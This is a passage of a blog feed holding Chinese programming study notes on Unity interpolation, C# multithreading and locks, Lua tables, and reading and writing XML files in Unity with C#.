class="line">    B.position = Vector3.Lerp(startPos, nowTarget, time);</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>

<h4 id="2、球型插值"><a href="#2、球型插值" class="headerlink" title="2、球型插值"></a>2、球型插值</h4><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//在终点处加上Vector3.up使unity可以辨认出运动方向，从而实现太阳东升下落的效果</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">C.position = Vector3.Slerp(Vector3.right * <span class="number">10</span>, Vector3.left * <span class="number">10</span> + Vector3.up * <span class="number">0.1f</span>, time * <span class="number">0.01f</span>);</span></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>cSharp多线程</title>
    <url>/2021/04/13/cSharp%E5%A4%9A%E7%BA%BF%E7%A8%8B/</url>
    <content><![CDATA[<center>简单地熟悉了下c#的多线程</center>

<a id="more"></a>

<h3 id="1-什么是进程？"><a href="#1-什么是进程？" class="headerlink" title="1.什么是进程？"></a>1.什么是进程？</h3><p>进程（Process）是计算机中的程序关于某数据集合上的一次运行活动<br>是系统进行资源分配和调度的基本单位，是操作系统结构的基础<br>说人话：打开一个应用程序就是在操作系统上开启了一个进程<br>进程之间可以相互独立运行，互不干扰<br>进程之间也可以相互访问、操作</p>
<h3 id="2-什么是线程"><a href="#2-什么是线程" class="headerlink" title="2.什么是线程?"></a>2.什么是线程?</h3><p>操作系统能够进行运算调度的最小单位。<br>它被包含在进程之中，是进程中的实际运作单位<br>一条线程指的是进程中一个单一顺序的控制流，一个进程中可以并发多个线程<br>我们目前写的程序 都在主线程中</p>
<p>简单理解线程：<br>就是代码从上到下运行的一条“管道”</p>
<h3 id="3-什么是多线程？"><a href="#3-什么是多线程？" class="headerlink" title="3.什么是多线程？"></a>3.什么是多线程？</h3><p>我们可以通过代码 开启新的线程<br>可以同时运行代码的多条“管道” 就叫多线程</p>
<h3 id="4-语法相关"><a href="#4-语法相关" class="headerlink" title="4.语法相关"></a>4.语法相关</h3><p>线程类<br>需要引用命名空间 using System.Threading;</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">NewThreadLogic</span>(<span class="params"></span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="comment">//新开线程 执行的代码逻辑 在该函数语句块中</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//1.申请一个新的线程 </span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//注意 线程执行的代码 需要封装到一个函数中</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//新线程 将要执行的代码逻辑 被封装到了一个函数语句块中</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">Thread t = <span class="keyword">new</span> Thread(NewThreadLogic);</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//2.启动线程</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">t.Start();</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//3.设置为后台线程</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//当前台线程都结束了的时候,整个程序也就结束了,即使还有后台线程正在运行</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//后台线程不会防止应用程序的进程被终止掉</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//如果不设置为后台线程 可能导致进程无法正常关闭</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">t.IsBackground = <span class="literal">true</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//4.关闭释放一个线程</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//如果开启的线程中不是死循环 是能够结束的逻辑 那么 不用刻意的去关闭它</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//如果是死循环 想要中止这个线程 有两种方式</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//4.1-死循环中bool标识</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//通过改变死循环中bool标识的值来达到停止线程的方法</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">bool</span> isRuning = <span class="literal">true</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(isRuning)</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="comment">//执行线程</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//停止线程</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">isRuning = <span class="literal">false</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//4.2-通过线程提供的方法(注意在.Net core版本中无法中止 会报错)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//中止线程</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">try</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    t.Abort();</span></pre></td></tr><tr><td class="code"><pre><span class="line">    t = <span class="literal">null</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">catch</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    </span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//5.线程休眠 单位毫秒 1s = 1000毫秒</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//在哪个线程里执行，就休眠哪个线程</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">Thread.Sleep(<span class="number">1000</span>);</span></pre></td></tr></table></figure>

<h3 id="5-线程之间共享数据"><a href="#5-线程之间共享数据" class="headerlink" title="5.线程之间共享数据"></a>5.线程之间共享数据</h3><p>多个线程使用的内存是共享的，都属于该应用程序(进程)<br>所以要注意 当多线程 同时操作同一片内存区域时可能会出问题<br>可以通过加锁的形式避免问题</p>
<p>lock<br>当我们在多个线程当中想要访问同样的东西 进行逻辑处理时<br>为了避免不必要的逻辑顺序执行的差错<br>lock(引用类型对象)</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//若不加锁会出现线程逻辑执行混乱的情况</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//例：一个死循环在主函数中，再开启另一个线程在函数中</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//若不加锁，则这两个死循环会发生4个不同逻辑的互相调用</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="keyword">string</span>[] args</span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    Thread t = <span class="keyword">new</span> Thread(NewThreadLogic);</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>)</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">            Console.SetCursorPosition(<span class="number">0</span>, <span class="number">0</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">            Console.ForegroundColor = ConsoleColor.Red;</span></pre></td></tr><tr><td class="code"><pre><span class="line">            Console.Write(<span class="string">"●"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">NewThreadLogic</span>(<span class="params"></span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)</span></pre></td></tr><tr><td class="code"><pre><span class="line">        &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">            Console.SetCursorPosition(<span class="number">5</span>, <span class="number">5</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">            Console.ForegroundColor = ConsoleColor.Red;</span></pre></td></tr><tr><td class="code"><pre><span class="line">            Console.Write(<span class="string">"■"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>

<p>因此利用lock来锁定线程让其一个线程执行完一次再调用另一个线程\</p>
<p>lock中必须传入引用类型对象</p>
<p>static object obj = new object();</p>
<p>但是加锁会损耗一些循环的效率</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="keyword">string</span>[] args</span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="keyword">while</span>(<span class="literal">true</span>)</span></pre></td></tr><tr><td class="code"><pre><span class="line">	&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">		<span class="keyword">lock</span>(obj)</span></pre></td></tr><tr><td class="code"><pre><span class="line">		&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">			Console.SetCursorPosition(<span class="number">0</span>, <span class="number">0</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">			Console.ForegroundColor = ConsoleColor.Red;</span></pre></td></tr><tr><td class="code"><pre><span class="line">			Console.Write(<span class="string">"●"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">		&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">NewThreadLogic</span>(<span class="params"></span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">lock</span>(obj)</span></pre></td></tr><tr><td class="code"><pre><span class="line">        &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">            Console.SetCursorPosition(<span class="number">5</span>, <span class="number">5</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">            Console.ForegroundColor = ConsoleColor.Red;</span></pre></td></tr><tr><td class="code"><pre><span class="line">            Console.Write(<span class="string">"■"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>

<h3 id="6-多线程对于我们的意义"><a href="#6-多线程对于我们的意义" class="headerlink" title="6.多线程对于我们的意义"></a>6.多线程对于我们的意义</h3><p>可以用多线程专门处理一些复杂耗时的逻辑<br>比如 寻路、网络通信等等</p>
]]></content>
  </entry>
  <entry>
    <title>lua学习笔记(四)</title>
    <url>/2021/03/30/lua%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E5%9B%9B)/</url>
    <content><![CDATA[<center>表是Lua语言中最主要(事实上也是唯一的)和强大的数据结构。</center>

<a id="more"></a>

<center><h2>表</h2></center>

<p>Lua语言中的表本质上是一种辅助数组，这种数组不仅可以使用数值作为索引，也可以使用字符串或其他任意类型的值作为索引(nil除外)</p>
<p>lua语言中的表要么是值，要么是变量，它们都是对象。</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">&gt; a = &#123;&#125;        <span class="comment">--&gt;创建一个表然后用表的引用赋值</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt; k = <span class="string">"x"</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt; a[k] = <span class="number">10</span>     <span class="comment">--&gt;新元素，键是"x"，值是10</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt; a[<span class="number">20</span>] = <span class="string">"great"</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt; a[<span class="string">"x"</span>]        <span class="comment">--&gt;10</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt; k = <span class="number">20</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt; a[k]</span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt; a[<span class="string">"x"</span>] = a[<span class="string">"x"</span>] + <span class="number">1</span>  <span class="comment">--增加元素"x"的值</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt; a[<span class="string">"x"</span>]        <span class="comment">--&gt; 11</span></span></pre></td></tr></table></figure>

<p>表永远是匿名的，表本身和保存表的变量之间没有固定的关系：</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">&gt; a = &#123;&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt; a[<span class="string">"x"</span>] = <span class="number">10</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt; b = a     <span class="comment">--'b'和'a'引用同一张表</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt; b[<span class="string">"x"</span>]    <span class="comment">--&gt; 10</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt; b[<span class="string">"x"</span>] = <span class="number">20</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt; a[<span class="string">"x"</span>]    <span class="comment">--&gt;20</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt; a = <span class="literal">nil</span>   <span class="comment">-- 只有'b'仍然指向表</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt; b = <span class="literal">nil</span>   <span class="comment">-- 没有指向表的引用了</span></span></pre></td></tr></table></figure>

<p>对于一个表而言，当程序中不再由指向它的引用时，垃圾收集器会最终删除这个表并重用其占用的内存。</p>
<h3 id="5-1表索引"><a href="#5-1表索引" class="headerlink" title="5.1表索引"></a>5.1表索引</h3><p>同一个表中存储的值可以具有不同的类型索引，并可以按需增长以容纳新的元素：</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">&gt; a = &#123;&#125;      <span class="comment">--空的表</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt; <span class="keyword">for</span> i = <span class="number">1</span>, <span class="number">1000</span> <span class="keyword">do</span> a[i] = i*<span class="number">2</span> <span class="keyword">end</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt; a[<span class="number">9</span>]</span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt; a[<span class="string">"x"</span>] = <span class="number">10</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt; a[<span class="string">"x"</span>]      <span class="comment">--&gt; 10</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt; a[<span class="string">"y"</span>]      <span class="comment">--&gt; nil</span></span></pre></td></tr></table></figure>

<p>如同全局变量一样，未经初始化的表元素为nil，将nil赋值给表元素可以将其删除。</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">&gt; a = &#123;&#125;                     <span class="comment">--空白表</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt; a.x = <span class="number">10</span>                   <span class="comment">--等价于a["x"] = 10</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt; a.x        <span class="comment">--&gt; 10          --等价于a["x"]</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt; a.y        <span class="comment">--&gt; nil         --等价于a["y"]</span></span></pre></td></tr></table></figure>

<p>注:初学者常常会混淆a.x和a[x]。实际上,<font color="red">a.x代表的是a[“x”],即由字符串”x”索引的表；而a[x]则是指向变量x对应的值索引的表</font></p>
<h3 id="5-2表构造器"><a href="#5-2表构造器" class="headerlink" title="5.2表构造器"></a>5.2表构造器</h3><p>表构造器是用来创建和初始化表的表达式，也是Lua语言中独有的也是最有用、最灵活的机制之一。</p>
<p>最简单的构造器是<font color="red">空构造器{}</font></p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">构造器第一个元素的索引是<span class="number">1</span>而不是<span class="number">0</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">days = &#123;<span class="string">"Sunday"</span>, <span class="string">"Monday"</span>, <span class="string">"Tuesday"</span>, <span class="string">"Wednesday"</span>, <span class="string">"Thursday"</span>, <span class="string">"Friday"</span>, <span class="string">"Saturaday"</span>&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(day[<span class="number">1</span>])    <span class="comment">--&gt;  Sunday</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(day[<span class="number">2</span>])    <span class="comment">--&gt;  Monday</span></span></pre></td></tr></table></figure>

<p>初始化记录</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">a = &#123;x = <span class="number">10</span>, y = <span class="number">20</span>&#125;   </span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">--等价于   </span></span></pre></td></tr><tr><td class="code"><pre><span class="line">a = &#123;&#125;;a.x = <span class="number">10</span>; a.y = <span class="number">20</span></span></pre></td></tr></table></figure>

<p>不过第一种能够提前判断表的大小，所以运行速度更快</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;x &#x3D; 0, y &#x3D; 0&#125;    &lt;--&gt;   &#123;[&quot;x&quot;] &#x3D; 0, [&quot;y&quot;] &#x3D; 0&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;&quot;r&quot;,&quot;g&quot;,&quot;b&quot;&#125;     &lt;--&gt;   &#123;[1] &#x3D; &quot;r&quot;, [2] &#x3D; &quot;g&quot;, [3] &#x3D; &quot;b&quot;&#125;</span></pre></td></tr></table></figure>

<h3 id="5-3数组、列表和序列"><a href="#5-3数组、列表和序列" class="headerlink" title="5.3数组、列表和序列"></a>5.3数组、列表和序列</h3><p>在一个表中所有的元素都不为nil的数组称为序列</p>
<p>Lua语言提供了获取序列长度的操作符#。对于字符串而言，该操作符返回字符串的字节数，对于表而言，该操作数返回表对应的长度。</p>
<p>不包含数值类型键的表就是长度为零的序列。</p>
<h3 id="5-4遍历表"><a href="#5-4遍历表" class="headerlink" title="5.4遍历表"></a>5.4遍历表</h3><p>我们可以使用pairs迭代器遍历表中的键值对：</p>
<p>每次运行得到的结果都是无序的</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">t = &#123;<span class="number">10</span>, <span class="built_in">print</span>, x= <span class="number">12</span>, k = <span class="string">"hi"</span>&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> k, v <span class="keyword">in</span> <span class="built_in">pairs</span>(t) <span class="keyword">do</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="built_in">print</span>(k, v)</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">end</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">   <span class="comment">--&gt;  1   10</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">   <span class="comment">--&gt;  k   hi</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">   <span class="comment">--&gt;  2   function: 0x420610</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">   <span class="comment">--&gt;  x   12</span></span></pre></td></tr></table></figure>

<p>有序的</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">t = &#123;<span class="number">10</span>, <span class="built_in">print</span>, x= <span class="number">12</span>, k = <span class="string">"hi"</span>&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i = <span class="number">1</span>, #t <span class="keyword">do</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="built_in">print</span>(k, v)</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">end</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">   <span class="comment">--&gt;  1   10</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">   <span class="comment">--&gt;  2   function: 0x420610</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">   <span class="comment">--&gt;  x   12</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">   <span class="comment">--&gt;  k   hi</span></span></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>xml文件</title>
    <url>/2021/05/16/xml%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<center>xml文件</center>

<p>这两天因为NGUI的数据处理需求学习了一下XML</p>
<a id="more"></a>

<h4 id="1、XML文件存放位置"><a href="#1、XML文件存放位置" class="headerlink" title="1、XML文件存放位置"></a>1、XML文件存放位置</h4><p>1.只读不写的XML文件</p>
<p>可以放在Resources或者StreamingAssets文件夹下</p>
<p>2.动态存储的XML文件</p>
<p>可以放在Application.persistentDataPath路径下</p>
<h4 id="2-C-读取XML的方法"><a href="#2-C-读取XML的方法" class="headerlink" title="2.C#读取XML的方法"></a>2.C#读取XML的方法</h4><p>1.XmlDocument    (把数据加载到内存中，方便读取)<br>2.XmlTextReader  (以流形式加载，内存占用更少，但是是单向只读，使用不是特别方便，除非有特殊需求，否则不会使用)<br>3.Linq</p>
<h4 id="3-读取xml文件信息"><a href="#3-读取xml文件信息" class="headerlink" title="3.读取xml文件信息"></a>3.读取xml文件信息</h4><p>使用XmlDocument类读取是较方便最容易理解和操作的方法</p>
<p>//通过XmlDocument读取xml文件 有两个API</p>
<p>1.直接根据xml字符串内容 来加载xml文件</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">XmlDocument xml = <span class="keyword">new</span> XmlDocument();</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//存放在Resorces文件夹下的xml文件加载处理</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">TextAsset asset = Resources.Load&lt;TextAsset&gt;(<span class="string">"test"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">print(asset.text);</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//通过这个方法 就能够翻译字符串为xml对象</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">xml.LoadXml(asset.text);</span></pre></td></tr></table></figure>

<p>2.是通过xml文件的路径去进行加载</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">xml.Load(Application.streamingAssetsPath + <span class="string">"/TestXml.xml"</span>);</span></pre></td></tr></table></figure>

<p>3.读取元素和属性信息</p>
<p>节点信息类<br>XmlNode 单个节点信息类<br>节点列表信息<br>XmlNodeList 多个节点信息类</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获取xml当中的根节点</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">XmlNode root = xml.SelectSingleNode(<span class="string">"Root"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//再通过根节点 去获取下面的子节点</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">XmlNode nodeName = root.SelectSingleNode(<span class="string">"name"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//如果想要获取节点包裹的元素信息 直接 .InnerText</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">print(nodeName.InnerText);</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">XmlNode nodeAge = root.SelectSingleNode(<span class="string">"age"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">print(nodeAge.InnerText);</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">XmlNode nodeItem = root.SelectSingleNode(<span class="string">"Item"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//第一种方式 直接 中括号获取信息</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">print(nodeItem.Attributes[<span class="string">"id"</span>].Value);</span></pre></td></tr><tr><td class="code"><pre><span class="line">print(nodeItem.Attributes[<span class="string">"num"</span>].Value);</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//第二种方式 </span></span></pre></td></tr><tr><td class="code"><pre><span class="line">print(nodeItem.Attributes.GetNamedItem(<span class="string">"id"</span>).Value);</span></pre></td></tr><tr><td class="code"><pre><span class="line">print(nodeItem.Attributes.GetNamedItem(<span class="string">"num"</span>).Value);</span></pre></td></tr></table></figure>

<p>获取 一个节点下的同名节点的方法</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">XmlNodeList friendList = root.SelectNodes(<span class="string">"Friend"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//遍历方式一：迭代器遍历</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (XmlNode item <span class="keyword">in</span> friendList)</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    print(item.SelectSingleNode(<span class="string">"name"</span>).InnerText);</span></pre></td></tr><tr><td class="code"><pre><span class="line">    print(item.SelectSingleNode(<span class="string">"age"</span>).InnerText);</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//遍历方式二：通过for循环遍历</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//通过XmlNodeList中的 成员变量 Count可以得到 节点数量</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; friendList.Count; i++)</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    print(friendList[i].SelectSingleNode(<span class="string">"name"</span>).InnerText);</span></pre></td></tr><tr><td class="code"><pre><span class="line">    print(friendList[i].SelectSingleNode(<span class="string">"age"</span>).InnerText);</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>

<h4 id="4-存储修改"><a href="#4-存储修改" class="headerlink" title="4.存储修改"></a>4.存储修改</h4><p>决定存储在哪个文件夹下</p>
<p>1.Resources 可读 不可写 打包后找不到  ×<br>2.Application.streamingAssetsPath 可读 PC端可写 找得到  ×<br>3.Application.dataPath 打包后找不到  ×<br>4.Application.persistentDataPath 可读可写找得到   √</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span> path = Application.persistentDataPath + <span class="string">"/PlayerInfo2.xml"</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">print(Application.persistentDataPath);</span></pre></td></tr></table></figure>

<p>存储xml文件</p>
<p>关键类 XmlDocument 用于创建节点 存储文件<br>关键类 XmlDeclaration 用于添加版本信息<br>关键类 XmlElement 节点类</p>
<p>存储有5步</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.创建文本对象</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">XmlDocument xml = <span class="keyword">new</span> XmlDocument();</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//2.添加固定版本信息</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//这一句代码 相当于就是创建&lt;?xml version="1.0" encoding="UTF-8"?&gt;这句内容</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">XmlDeclaration xmlDec = xml.CreateXmlDeclaration(<span class="string">"1.0"</span>, <span class="string">"UTF-8"</span>, <span class="string">""</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//创建完成过后 要添加进入 文本对象中</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">xml.AppendChild(xmlDec);</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//3.添加根节点</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">XmlElement root = xml.CreateElement(<span class="string">"Root"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">xml.AppendChild(root);</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//4.为根节点添加子节点</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//加了一个 name子节点</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">XmlElement name = xml.CreateElement(<span class="string">"name"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">name.InnerText = <span class="string">"唐老狮"</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">root.AppendChild(name);</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">XmlElement atk = xml.CreateElement(<span class="string">"atk"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">atk.InnerText = <span class="string">"10"</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">root.AppendChild(atk);</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">XmlElement listInt = xml.CreateElement(<span class="string">"listInt"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span 